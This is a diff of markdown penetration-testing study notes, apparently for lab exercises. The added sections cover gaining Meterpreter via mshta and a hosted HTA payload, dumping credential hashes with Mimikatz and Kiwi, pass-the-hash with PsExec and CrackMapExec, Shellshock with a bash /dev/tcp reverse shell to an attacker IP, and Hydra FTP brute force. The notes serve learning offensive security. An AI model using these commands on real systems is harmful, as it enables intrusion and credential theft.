@@ -1086,7 +1086,7 @@ start windowslog.txt:winpeas.exe
 
 #### Using Symbolic Links with ADS
 
-Attackers can also use **symbolic links** to disguise or redirect access to the hidden payloads within resource streams. A symbolic link is a pointer that refers to a file or directory elsewhere, further obfuscating malicious activity.
+Attackers can also use symbolic links to disguise or redirect access to the hidden payloads within resource streams. A symbolic link is a pointer that refers to a file or directory elsewhere, further obfuscating malicious activity.
 
 Example of creating a symbolic link within the `C:\Windows\System32` directory:
 
@@ -1252,106 +1252,404 @@ ssword))
 echo $password
 ```
 
-1. `[System.Convert]::FromBase64String(...)`: The base64 string is a textual representation of binary data. To retrieve the original password, we first need to decode it into its binary form, as this binary data holds the raw content necessary for converting to readable text. The `System.Convert` .NET class provides methods for data type conversions, and here we use its `FromBase64String` method to convert the base64 string into a byte array, which represents the raw binary data. Since the byte array is not directly human-readable, it must be further processed.
+Breaking down..... 
 
-2. `[System.Text.Encoding]::UTF8.GetString(...)`: To convert the binary data into a readable format, we use the `System.Text.Encoding` .NET class, which handles character encoding and decoding. Specifically, the `UTF8.GetString` method translates the byte array into a UTF-8 encoded string. UTF-8 is a widely used character encoding standard in PowerShell, ensuring that the decoded string is properly interpreted as human-readable text. 
+```
+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pa
+ssword))
+```
 
-We can now leverage the administrative credentials to **escalate privileges and gain an elevated Meterpreter session**.
+1. `[System.Convert]::FromBase64String(<base64_password>)`: The base64 string is a textual representation of binary data. To retrieve the original password, we first need to decode it into its binary form.  The `System.Convert` .NET class provides methods for data type conversions, and here we use its `FromBase64String` method to convert the base64 string into a byte array, which represents the raw binary data. Since the byte array is not really human-readable, it must be further processed.
 
-This information was really helpful I would like to have the information to be reformatted and flow a bit better and not use bullets and have them in paragraph format and to not have it be "Reason: Explanation" like you did for certain topics like >
-"**Post-Exploitation Situations**: If you have already gained user-level access and need **privilege escalation**, this method can deliver the payload under elevated privileges (assuming the right user opens it)." I just want to entire explanation together. Also, I'm not really sure what embedded powershell means so can you an an explanation what that means especially when it comes to hta files when its relevant in the information:
+2. `[System.Text.Encoding]::UTF8.GetString(<binary_btye_array>)`: To convert the binary data into a readable format, we use the `System.Text.Encoding` .NET class, which handles character encoding and decoding. Specifically, the `UTF8.GetString` method translates the byte array into a UTF-8 encoded string. UTF-8 is a widely used character encoding standard in PowerShell, ensuring that the decoded string is properly interpreted as human-readable text. 
 
-
-----
-##### mshta.exe and an HTA File to Gain a Meterpreter Session
-
-
-mshta.txt
-
-
-Using `mshta.exe` with an HTA file to gain a **Meterpreter session** is an exploitation method that leverages legitimate tools for access. Microsoft's HTML Application host aka `mshta.exe` is a Microsoft binary designed to execute HTML-based applications (HTA files). HTA files can run embedded PowerShell code, hidden within the file, which executes when the application runs and creates a **reverse shell** to the Meterpreter. Since `mshta.exe` is a legitimate component of the Windows operating system, this method demonstrates **Living off the Land (LotL)** tactics, where attackers rely on tools already installed on the target system to **evade detection** by antivirus (AV) or endpoint detection and response (EDR) solutions. Also, although PowerShell is often restricted by execution policies that block untrusted scripts, `mshta.exe` **bypasses these restrictions** by running the embedded PowerShell commands directly from the HTA file.
-
-
-Using the `hta_server` module in **Metasploit** to host and serve the HTA file allows the payload to be delivered **over the network**, eliminating the need to manually transfer files to the target system. This is particularly useful when direct file uploads are risky or monitored. The target machine only needs to **visit the malicious URL once** (e.g., `http://10.10.31.2:8080/Bn75U0NL8ONS.hta`) for the payload to be executed, providing a quick and efficient way to establish remote access. Once the embedded powershell commands of the **HTA payload** is executed and the Meterpreter session is established, the session runs **independently of the command prompt**. This makes the method ideal for one-time exploitation or scenarios where persistent access isn’t required.  The session will stay active as long as the connection between the target and attacker’s machine remains intact, but persistence mechanisms are required  (e.g., a scheduled task or registry key) if you want to maintain access through reboots or process restarts.
-
-In this lab, since the command prompt (`cmd.exe`) was **launched with administrator privileges** using the `runas.exe` command, any subsequent process—such as the HTA payload run with `mshta.exe`—inherits the same elevated privileges. This means that the resulting Meterpreter session will have **administrator-level access**, allowing for privileged operations such as disabling security tools, extracting passwords from memory, or modifying system configurations.
-
-Many endpoint security solutions don’t monitor or block `mshta.exe` as aggressively as custom executables. This makes it a highly effective way to deliver and execute malicious code without raising immediate suspicion. When file transfer to the target system is not feasible, **network-hosted delivery using the HTA server** ensures remote code execution without leaving obvious traces. This method teaches the importance of **chaining privilege escalation with remote code execution**, as it demonstrates how attackers can use legitimate tools to gain elevated access and maintain control over a system.
-
-
-
-
-
-
-
-
-**Step 7:** We can ran a command prompt as an administrator user using discover credentials.  The elevated cmd prompt can be used to 
-
-
+We can ran a command prompt as an administrator user using discover credentials.
 
 ```
 runas.exe /user:administrator cmd
 ```
 
+ We can now pretty much do whatever we want to leverage the administrative credentials to escalate privileges and gain an elevated Meterpreter session.  One option we can try is a hosted hta file to gain a meterpreter session.
 
+##### mshta.exe and an HTA Payload to Gain a Meterpreter Session
 
+Microsoft's HTML Application host aka `mshta.exe` is a Microsoft binary designed to execute HTML-based applications (HTA files).  HTA files can run embedded code hidden within the file, like powershell, which executes when the application runs. We can use `mshta.exe` with an HTA file to gain a Meterpreter session since 1.) `mshta.exe` is a legit component of the Windows which could evade detection by antivirus solutions making it a Living off the Land/LOLBin tactic and 2.) `mshta.exe` bypasses PowerShell's execution policy restrictions that block untrusted scripts allowing the embedded PowerShell commands from the HTA file to run.
 
-
-
-
----
-
-
-
-
-
-**Step 8:** Running the **hta_server** module to gain the meterpreter shell. Start msfconsole.
-
-**Commands:**
+We can use the hta_server module in Metasploit (`exploit/windows/misc/hta_server`) to host and serve a HTA file which would allows the payload to be delivered over the network.
 
 ```
-msfconsole -q
 use exploit/windows/misc/hta_server
+set SRVHOST <attack_ip>
 exploit
 ```
 
-“This module hosts an HTML Application (HTA) that when opened will run a payload via Powershell.”
-
-
-
-Copy the generated payload i.e **“http://10.10.31.2:8080/Bn75U0NL8ONS.hta”** and run it on cmd.exe with mshta command to gain the meterpreter shell.
-
-**Switch to Target Machine.**
-
-**Step 9:** Gaining a meterpreter shell.
-
-**Command:**
+Once the exploit is started, it will generate a host HTA link (e.g., `http://10.10.31.2:8080/Bn75U0NL8ONS.hta`) that a target only needs to visit once which would execute the embedded powershell commands of the HTA payload and establish a meterpreter session. In this case, we can run mshta.exe through the elevated cmd prompt. 
 
 ```
 mshta.exe http://10.10.31.2:8080/Bn75U0NL8ONS.hta
 ```
 
-**Note:** You need to use your own metasploit HTA server link.
+Since the command prompt was launched with administrator privileges, any subsequent process like the  `mshta.exe` process running the hta payload will inherit the same elevated privileges. So the resulting Meterpreter session will have administrator-level access. 
 
-We can expect a meterpreter shell.
+**Helpful Meterpreter Windows OS Tips**
 
-**Step 10:** Find the flag.
+- Get to root directory -> `cd /
+- Navigate to a directory -> `C:\\Users\\Administrator\\Desktop`
+- List contents of a directory -> `dir`
+- Open contents of a txt file -> `cat <file_name>`
 
-**Commands:**
+---
+
+## Dumping Hashes with Mimikatz/Kiwi
+
+
+Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy (@gentilkiwi) that allows for the extraction of clear-text passwords, hashes and Kerberos tickets from memory through lsass.exe. The lsass process is involved with authenticating users and part of the process involves interacting with the SAM database. The SAM (Security Account Manager) database, is a database file on Windows systems that stores hashed user passwords. Lsass will cache credentials retrieved from the SAM database and Mimikatz will extract hashes from the lsass.exe process memory.
+
+We can utilize the pre-compiled mimikatz executable, alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension Kiwi. In Metasploit, `kiwi` is an extension of Meterpreter that is essentially a Metasploit implementation of Mimikatz.
+
+Mimikatz will require elevated privileges in order to run correctly since the Lsass process runs under privilege SYSTEM account.
+
+#### Exploitation Process
+
+We'll exploit the server, then dump the hashes with mimikatz/kiwi and then either collect the hashes to be cracked laster or use the hash to perform a pass-the-hash attack by authenticating legitimately  to a service.
+
+#### Gaining Initial Access on Target
+
+Run an initial Nmap scan and try to exploit any service. We'll use the meterpreter session to view the initial privileges and upload the payload/akagi executables to the target.
+
+1. **Start postgresql and  metasploit**
+```
+service postgresql start && msfconsole
+```
+ 2. **Run an exploit to get a meterpreter session on the target**: This is an example exploiting BadBlue which is a lightweight web server software originally created for file sharing and web hosting on Windows systems. Although it was once popular for these purposes, BadBlue is now considered outdated, and its security flaws have made it a target for exploitation. One of the most serious vulnerabilities in older versions of BadBlue is a buffer overflow exploit that enables remote code execution.  The Metasploit module `exploit/windows/http/badblue_passthru` targets a vulnerability in older versions of BadBlue (2.7 and earlier), exploiting a flaw in the `Passthru.dll` component which handles user input and passes it to system commands. By sending malicious HTTP requests, we can execute arbitrary commands and gain remote shell access with the same privileges as the web server, without needing valid credentials. For the exploitation module,  you would just configure the  `RHOSTS` (The target IP). You can update the meterpreter payload (optional) should get a `windows/meterpreter/reverse_tcp` payload by default.
+```
+use exploit/windows/http/badblue_passthru
+set RHOSTS 10.61.25.84
+exploit
+```
+
+3. **Find and migrate to the LSASS process**:  When connected to a Meterpreter session, you're generally tied to the process or service that was exploited and the  `migrate` command in Metasploit allows us to move the Meterpreter session to another process.   LSASS (Local Security Authority Subsystem Service) is a crucial process in Windows responsible for enforcing security policies, handling password changes, and managing stored credentials, including NTLM hashes. Migrating to the LSASS process allows us to extract credentials like NTLM hashes from memory while also granting higher privileges. To use `migrate`, we need to specify process by providing its PID (process ID). We would need to already be an administrator account to be migrate to any process. To find the PID for the service, we can use the `pgrep` command and just search the service's name. The `pgrep` command is a Unix-based utility only natively available on Linux/Mac , however, `pgrep` becomes available as a Meterpreter command when you're working with a compromised Windows system.
+
+- **Use pgrep to get the PID**
+```
+meterpreter> pgrep lsass
+```
+- **Migrate to the LSASS service using that PID**
+```
+meterpreter> migrate 678
+```
+
+We should now have NT AUTHORITY\SYSTEM privileges, we can dump the hashes
+
+**Useful Meterpreter Commands:**
+- Get General System Info = `sysinfo`
+- Get user ID = `getuid`
+#### Option 1: Dumping Hashes with Kiwi Extension
+
+In Metasploit, `kiwi` is an extension of **Meterpreter** that provides advanced credential extraction capabilities. It is essentially a Metasploit implementation of **Mimikatz**,  which is a well-known tool for extracting credentials from Windows systems. Run Kiwi to get the NTLM Hashes:
+
+1.  **Load the Kiwi extension**
+```
+meterpreter> load kiwi
+```
+- Note: You can view all of the new available kiwi commands from the `help` menu
+
+**Dumping hashes** = `lsa_dump_sam`: The lsa_dump_sam command  extracts NTLM and LM password hashes for local users from the cached contents of the SAM database. The hashes are pulled directly from memory, bypassing file locks. The hashes should be outputted, this will be the same if you did this with Mimikatz.  lsa_dump_sam should also return the syskey that's used to encypt the SAM database and a SAMkey. This could be useful later.
+```
+meterpreter> lsa_dump_sam
+```
+#### Other Useful Kiwi Commands
+
+- **Dump Secrets** = `lsa_dump_secrets` =  Can return some clear text passwords in some cases
+- **Change a Password** = `password_change` = You have the ability to change a password but its not recommended during a pentest as these can be used in a production environment.
+- **Getting any creds it can find** =  `creds_all` = This cmd can return hashes/kerberos tickets etc. Windows 8.1+ doesn't store cleartext passwords so the Password fields will likely return `null`
+
+**View the Hashes**: The hashes should also display after running something like `lsa_dump_sam`  but can also run `hashdump` which would display the same hashes:
+```
+meterpreter> hashdump
+```
+
+The output should be structured like this....
+```
+username : SID : LM_hash : NTLM_hash
+```
+
+We'll need to copy both the LM hash and the NTLM hash since certain exploits like the metasploit Psexec module requires both.
+
+#### Option 2: Dumping Hashes with Mimikatz Executable
+
+Upload the mimikatz to the target using the meterpreter/shell session, and then start mimikatz
+
+1. **Create a Temp directory**:  It's recommended to have a Temp directory on the root of the C: drive to upload the payload to, so navigate/create the directory on the target. 
+```
+meterpreter> cd C:\\
+meterpreter> mkdir Temp
+meterpreter> cd Temp\\
+```
+
+2. **Upload the mimikatz executable**: Use the `upload` command to push mimikatz exe to the target. Metasploit has a 32-bit & 64-bit mimikatz exe available to upload such as `/usr/share/windows-resources/mimikatz/x64/mimikatz.exe`.
+```
+meterpreter> upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+```
+
+3. **Start Mimikatz**: First start the shell session using `shell` so you can run the executable. Then execute mimikatz:
 
 ```
-sessions -i 1
-cd /
-cd C:\\Users\\Administrator\\Desktop
-dir
-cat flag.txt
+meterpreter> shell
+
+C:\Temp> .\mimikatz.exe
+```
+
+4. **Check privileges**:  Running `privilege::debug` ensures Mimikatz has the necessary permissions to execute its functions. If you get a "Privilege '20' Ok", then you have the necessary permissions.
+```
+mimikatz # privilege::debug
+```
+
+5. **Dump the hashes:** Run the `lsadump::sam` command to dump the NTLM hashes. This is provide a little more information than the kiwi extension.
+```
+mimikatz # lsadump::sam
+```
+
+##### Other Mimikatz Options
+
+- `lsadump::secrets` = This is equivalent of the `lsa_dump_secrets` kiwi command which might show clear text passwords.
+- **Display Logon Passwords**: Whenever a user logons to a windows systems if the system is configured to store logon passwords in cleartext then Mimikatz can display these logon passwords. You can run the `sekurlsa::logonpasswords` command for displaying the passwords but note that the passwords would likely be set to `(null)` if clear text isn't configured for the system
+```
+mimikatz # sekurlsa::logonpasswords
+```
+
+## Pass the Hash
+
+Pass-the-hash is an exploitation technique to capture NTLM hashes or clear-text passwords and utilizing them to authenticate against a target system legitimately.  Rather than exploiting services directly, this method leverages legitimate credentials to gain access to the system.
+
+If you successfully obtain administrative access on a Windows target system, there's no need to re-authenticate to access the same Meterpreter session or reverse shell with administrative privileges. Even if the vulnerable service is patched, disabled, or blocked by a firewall rule, you can still regain access using the captured administrative hash. The hash allows you to access the system whenever you want, making this a form of persistence. Essentially, with the hash, you bypass the need to rely on the previously exploited service for continued access.
+
+##### Performing the Pass-the-Hash Attack
+
+Now we can used the captured NTLM hashes to authenticate with the target legitimately to the service/system.  Tools like the Metasploit PsExec module and CrackMapExec can be used to carry out this type of attack:
+
+##### Metasploit PxExec
+The `windows/smb/psexec` module in Metasploit is commonly used for pass-the-hash attacks because it interacts with the SMB protocol in Windows networks, allowing for remote execution. The module mimics the legitimate psexec tool to authenticate with the SMB service on a target machine using captured NTLM or LM hashes, bypassing the need for a plain-text password. Once authenticated, the module remotely executes commands or delivers a payload, such as a reverse shell, to gain control of the system. 
+
+1. **Search for the PsExec Module**: Background the existing meterpreter session using `Ctrl+Z`
+```
+search psexec
+```
+We need the `exploit/windows/smb/psexec` exploit. Configure the exploit module and payload options. Also, just for this module we need to provide both the lm_hash and ntlm_hash since you might get error only posting the ntlm hash alone
+	- `RHOST` = Target IP
+	- `LPORT`= Your listening port, make sure this doesn't overlap with the local port used for the previous meterpreter session since we're going to be setting up another metrepreter session. (Can check by running `sessions` to see the port used for the session)
+	- `SMBDomain` = If connected to a domain
+	- `SMBUser` / `SMBPass` = The `SMBPass` can accept either the clear-text password or the NTLM hash which is what we'll provide.  Just for this module we need to provide both the lm_hash and ntlm_hash since you might get error only posting the ntlm hash alone. it would be set as `set SMBPass lm_hash:ntlm_hash`. The LM hash `aad3b435b51404eeaad3b435b51404ee`  is a default "empty" LM hash value, often used when the system doesn't actually use LM hashes which is common with modern system. 
+```
+use exploit/windows/smb/psexec
+set SMBUser <user>
+set SMBPass aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
+set LPORT 4312
+```
+
+This exploit uses SMB to gain remote code execution, there's different methods for delivering and executing the payload on the target system so we might need to specify it specifically here to get a meterpreter session. We can try running `set target` command for `Command` and try setting it as Native upload  to have the  Meterpreter payload uploaded to the target. 
+```
+set target Native\ upload
+```
+Run the exploit
+```
+exploit
+```
+You might need to tweak the target for the exploit, but you should get a meterpreter session.
+
+##### CrackMapExec
+The other tool for the pass-the-hash attack using the dumped NTLM hashes is `crackmapexec`. Keep in mind this might have issues with python dependencies so you might see errors.
+
+General Syntax:
+```
+crackmapexec smb target -u username -H "NTLM_hash" -x "enter_cmd_here"
+```
+- `-u` = username
+- `-H`= The NTLM Hash
+- `-x` = The command that will execute on the target
+
+Example:
+```
+crackmapexec smb target -u Administrator -H "5f4dcc3b5aa765d61d8327deb882cf99" -x "net user"
 ```
 
 
 # Linux-Vulnerabilities
 
+
+Linux is a free and open-source operating system made up of the **Linux kernel**, developed by Linus Torvalds, and the **GNU toolkit** (cat ls cd dir), initiated by Richard Stallman. Often referred to as **GNU/Linux**, it is commonly used as a server OS, with services and protocols running that can serve as access vectors for attackers. 
+- **Apache Web Server** | TCP ports 80/443 | Free and open source cross-platform web server which accounts for over 80% of web servers globally.
+- **SSH (Secure Shell)** |TCP ports 22 |  SSH is a cryptographic remote access protocol that is used to remotely access and control systems over an unsecured network. SSH was developed as a secure successor to telnet.
+- **FTP (File Transfer Protocol)** | TCP port 21 | The protocol is used to facilitate file sharing between a server and client/clients and vice versa.
+- **SAMBA** | TCP port 445 |  Samba is the Linux implementation of SMB  and allows Windows systems to access Linux shares and devices.
+
+
 # Exploiting-Linux-Vulnerabilities
 
+### ShellShock
+
+Shellshock is a family of vulnerabilities in the Bash shell (since version 1.3) that allows an attacker to execute remote arbitrary commands, potentially granting remote access via a reverse shell. The vulnerability was discovered in September 2014.
+
+ The vulnerability arises when Bash mistakenly executes trailing commands after a specific string of characters: `() {:;};`. Anything following this string is executed unintentionally by Bash. Apache web servers configured to run CGI scripts are particularly vulnerable. CGI scripts are used by Apache to execute commands on the server and return results to a web client. Attackers can exploit CGI scripts by injecting malicious commands into request headers, such as the User-Agent header. When the web server executes the CGI script, Bash is triggered and the injected commands are executed.
+    
+**Exploitation Process**
+To exploit Shellshock, you need a vulnerable input vector, such as a CGI script running on an Apache server. The key steps include:
+1. Identifying a CGI script that interacts with Bash.
+2. Sending a crafted HTTP request that includes the malicious `() {:;};` string followed by the desired commands.
+3. The web server creates a new process and executes the CGI script using Bash, processing the injected commands.
+
+**Tools for Exploitation**
+The vulnerability can be exploited manually by interacting with the server via proxy tools or automatically with Metasploit's exploit module. These methods can result in obtaining a reverse shell or a Meterpreter session.
+
+###### 1. Find the input vector to exploit
+
+We can first view the page source of the website to see if there's a CGI script explicitly visible in the webpages HTML/Javascript. Sometimes, CGI scripts can be visible here which would make it easier to identify and attempt the exploitation. Something like this:
+```
+xhttp.open("GET", "/gettime.cgi", true)
+```
+However, visibility in the page source is not necessary for discovery.  Tools like Nmap or Nikto scan for common script locations (e.g., `/cgi-bin/`), while DirBuster and Gobuster brute-force hidden paths. Misconfigured servers may reveal scripts through error messages like 404s or by allowing directory listings. Even without visible clues, attackers can analyze HTTP responses to infer the presence of CGI scripts or Bash-related processes.
+
+###### 2. Check if the system is vulnerable to ShellShock
+
+We can use the nmap script `http-shellshock` to check if the target is vulnerable to it. We also need to provide the arguments for the script 
+```
+nmap -sV target --script=http-shellshock --script-args "http-shellshock.uri"=<loc_of_cgi_script>
+```
+- `-sV` = Service version detection
+- `"http-shellshock.uri"` = The location of the cgi script
+
+Example:
+```
+nmap -sV 10.66.38.37 --script=http-shellshock --script-args "http-shellshock.uri"=/test.cgi
+```
+
+We can use the cgi script to inject the special characters within HTTP headers using the User-Agent header
+
+###### 3. Use a proxy like Burp Suite/ZAP
+- ***Note**: FoxyProxy is a Firefox/Chrome extension that helps manage proxy settings more efficiently. By switching profiles, you can direct browser traffic through Burp Suite or ZAP to intercept and analyze web requests. 
+
+Open BurpSuite (`From Kali: Menu > Web Application Analysis > burpsuite`) a temporary project that's using Burp defaults is fine. The `Proxy` tab in Burp Suite is where you can view and intercept web traffic between your browser and the target server. It allows you to see requests and responses as they pass through Burp, making it easier to inspect or modify them.
+Navigate to the 'Intercept' tab under the Proxy (`Proxy > Intercept`). First, make sure the Intercept is enabled (`Intercept is on`), as this feature in Burp Suite pauses traffic, allowing you to inspect, modify, forward, or drop each request/response before it reaches the server or client in real time.
+
+- `Forward` allows the intercepted HTTP request/response to proceed to its destination
+- `Drop` means discarding the intercepted HTTP request/response.
+
+Under' 'Intercept', forward/drop request until you find the request involving the cgi script. We can inject the special characters through the User-Agent using a repeater (`Right-click within the packet data > Send to repeater`). The 'Repeater' in Burp Suite allows us to send individual HTTP requests to the server which we can modify to test the server's response. Navigate to the Repeater tab where you'll see the same request, then clear the header. First, include the special character `() { :; };` followed by whatever command you want to execute.
+```
+() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
+```
+Click `Send` to send the request through the repeater. If you can get an output in the Response then we know the vulnerability works.
+
+###### 4. Setup a Netcat Listener
+
+We can gain a reverse shell on that target by using bash to connect to a listener on our Kali Linux box using netcat. To set up a basic listener in Netcat, we need the `-lp` options to specify that we're setting up a listener on a port: 
+
+```
+nc -nvlp 1234
+```
+- `-l`: Listener | This tells Netcat to listen for incoming connections 
+- `-p 1234`: Specifies the port number to listen on, which in this case is port 1234.
+- `-n`: (Optional) | Tells Netcat not to resolve hostnames 
+- `-v`:  (Optional) Runs Netcat in verbose mode, providing detailed output bash
+
+###### 4. Edit the request to include the reverse shell back to the attack box
+
+General Syntax:
+```
+() { :; }; echo; echo; /bin/bash -c "bash -i>&/dev/tcp/<attack_box_IP>/<listening_port> 0>&1"
+```
+
+Example (Breakdown of the reverse shell explained below):
+```
+() { :; }; echo; echo; /bin/bash -c "bash -i >& /dev/tcp/10.92.2.6/1234 0>&1"
+```
+
+#### Redirections and File Descriptors
+In Linux/Unix, redirection controls where input and output goes. By default, commands send their output (stdout) to the terminal and read input (stdin) from the keyboard. Redirection allows us to change this behavior using symbols like `>` (to redirect output), `>>` (to append output), and `<` (to redirect input). File descriptors are used to represent input/output streams:
+- `0` = Standard Input (stdin): Where commands read input (normally the keyboard).
+- `1` = Standard Output (stdout): Where commands send normal output (normally the terminal).
+- `2` = Standard Error (stderr): Where commands send error messages (normally the terminal)
+When using `>&`, the `&` specifies which file descriptors are being redirected. For example, you could specify something like `>&2`which would mean to redirect the output to the same place as the standard error etc. Using  `>&` where the file descriptor after `&`  isn't specified would mean redirects both stdout (1) and stderr (2) to the same destination.
+##### Reverse Shell Breakdown
+```
+bash -i >& /dev/tcp/10.92.2.6/1234 0>&1
+```
+1. `bash -i`: This starts an interactive Bash shell, keeping the shell open to accept and execute commands.
+2. `>&`: Redirects both the standard output (1) and standard error (2) 
+3. **`/dev/tcp/10.92.2.6/1234`**: This tells the system to send both the standard output and error output to a remote IP (`10.92.2.6`) over TCP via port `1234` . The `/dev/tcp/` is a special file system in Linux that allows the creation of network connections by writing to a specific IP and port using `/dev/tcp/[IP]/[PORT]`. 
+4. `0>&1`: This redirects stdin (0) to the same destination as stdout (1). The standard output has already been redirected to the remote IP so instead of reading input from the terminal, the shell will now read input from the network connection (i.e., from the attack box).
+
+As a result, the attacker can send commands to the shell over the network (via stdin), and the shell will send back both normal output and error messages (via stdout and stderr) to the remote machine.
+
+#### Performing the Exploit using Metasploit
+
+1. Start Postgresql and open Metasploit (`msfconsole)
+```
+service postgresql start && msfconsole
+```
+2. Search for Shellshock
+```
+search shellshock
+```
+There will be an auxiliary scanner for shellshock which checks for the vulnerability (`auxiliary/scanner/http/apache_mod_cgi_bash_env`) we can just go with the exploit module (`exploit/multi/http/apache_mod_cgi_bash_env_exec`)
+```
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+```
+3. Configure and rune the exploit: You'll likely need to setup the `RHOST` for the target and the `TARGETURI` for the cgi script location.
+```
+set RHOST 10.55.21.43
+
+set TARGETURI /test.cgi
+```
+4. Run the exploit: This should setup a meterpreter session
+```
+exploit
+```
+
+
+## FTP
+
+FTP (File Transfer Protocol) operates on TCP port 21 and is commonly used for file sharing between servers and clients. Frequently used to transfer files to and from web server directories. Authentication typically requires a username and password, making FTP servers susceptible to brute-force attacks to uncover valid credentials. However, some FTP servers may permit anonymous access, allowing anyone to connect without authentication.
+
+Inherent vulnerabilities in FTP is primarily dependent on the version of FTP software being used.
+
+
+```
+nmap -sV target
+```
+
+#### Checking for Anonymous Access
+
+- **Option 1:  Connect directly to the FTP server**: You can use the ftp utility in Kali would you could see if it prompts you to enter credentials. If it does, then anonymous access isn't allowed
+
+```
+ftp <target>
+```
+
+- **Option 2: Run the ftp-anon nmap script**: This NSE script should return if anonymous access is allowed on the target.
+
+```
+nmap --script=ftp-anon <target>
+```
+
+
+### Performing FTP Brute Force
+
+Hydra can be used to perform the brute force on the FTP server using username/password word lists. :
+- **Usernames** = `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
+- **Passwords** =   `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
+
+```
+hydra -L <username_wordlist> -P <password_wordlist> target -t 4 ftp
+```
+
+#### Looking for Inherent FTP Vulnerabilities 
+
+Keep in mind you can search for vulnerabilities within the FTP software itself using something like searchsploit/metasploit to search for vulnerabilities.
+
+```
+searchsploit <ftp_software>
+```
 # Linux-Privilege-Escalation
 
 # Linux-Credential-Dumping
